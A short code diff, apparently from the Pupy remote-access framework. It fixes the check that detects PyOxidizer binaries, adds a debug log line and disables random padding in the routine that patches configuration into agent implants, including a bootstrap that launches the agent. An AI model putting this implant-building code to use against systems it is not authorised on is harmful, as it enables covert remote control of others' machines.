@@ -105,7 +105,7 @@ def get_edit_binary(target, display, path, conf):
     i = 0
     offsets = []
     is_pyoxidizer = False
-    if binary.find(b'OxidizedResource', 0):
+    if binary.find(b'OxidizedResource', 0) != -1:
         is_pyoxidizer = True
     while True:
         i = binary.find(b'####---PUPY_CONFIG_COMES_HERE---####', i+1)
@@ -132,6 +132,7 @@ def get_edit_binary(target, display, path, conf):
     )
     
     if is_pyoxidizer:
+        logger.debug("pyoxidizer binary detected")
         pyoxidizer_bootstrap = f"import marshal,pupy.agent; pupy.agent.main(config=marshal.loads({marshal.dumps(config)}))#"
         new_conf = pyoxidizer_bootstrap.encode('ascii')
         new_conf_len = len(pyoxidizer_bootstrap)
@@ -158,8 +159,8 @@ def get_edit_binary(target, display, path, conf):
             'You need to recompile the dll with '
             'a bigger buffer'.format(new_conf_len, HARDCODED_CONF_SIZE)
         )
-    if not is_pyoxidizer:
-        new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+    #if not is_pyoxidizer:
+    #    new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
     #else:
     #    new_conf = new_conf + (b"#"*(HARDCODED_CONF_SIZE-new_conf_len))
 
